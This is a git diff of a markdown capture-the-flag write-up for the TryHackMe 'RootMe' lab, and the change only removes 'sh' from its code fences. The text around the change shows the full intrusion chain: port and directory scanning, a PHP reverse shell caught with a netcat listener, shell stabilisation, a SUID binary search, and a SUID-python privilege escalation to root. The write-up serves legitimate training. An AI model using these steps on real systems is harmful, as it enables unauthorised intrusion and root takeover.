@@ -6,7 +6,7 @@ https://tryhackme.com/room/rrootme
 ### Command used: nmap<br>
 <br>
 
-```sh
+```
 nmap -sV -p22,80 rootme.vul
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-06 02:06 CDT
 Nmap scan report for rootme.vul (10.10.74.64)
@@ -25,7 +25,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds
 ### Command used: gobuster
 <br>
 
-```sh
+```
 gobuster dir --url http://rootme.vul --wordlist /usr/share/wordlists/dirb/common.txt 
 ===============================================================
 Gobuster v3.1.0
@@ -83,7 +83,7 @@ Here, we have our first flag - user.txt:<br><br>
 
 We're not done yet. There's still a root.txt flag somewhere. We change course and upload a PHP reverse shell (this should have been done in the first place) (https://pentestmonkey.net/tools/web-shells/php-reverse-shell). We configure the shell, start a listener on netcat, and launch the shell:
 
-```sh
+```
 nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.2.105.239] from (UNKNOWN) [10.10.74.64] 38480
@@ -97,7 +97,7 @@ $
 
 We then spawn bash from Python:
 
-```sh
+```
 $ python -c 'import pty;pty.spawn("/bin/bash")'
 Ctrl+Z
 stty raw -echo
@@ -110,7 +110,7 @@ export TERM=xterm
 
 Now that we have a stable shell, we look for binaries with the SUID bit enabled:
 
-```sh
+```
 find / -type f -user root -perm -4000 2>/dev/null
 
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -128,7 +128,7 @@ find / -type f -user root -perm -4000 2>/dev/null
 
 The interesting find here /usr/bin/python. We head on over to GTFOBins and search for possible exploits (https://gtfobins.github.io/gtfobins/python/#suid).
 
-```sh
+```
 $ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 # whoami
 whoami
@@ -137,7 +137,7 @@ root
 
 Now that we're running as root, we go look for the root.txt flag:
 
-```sh
+```
 # cd root
 cd root
 # ls
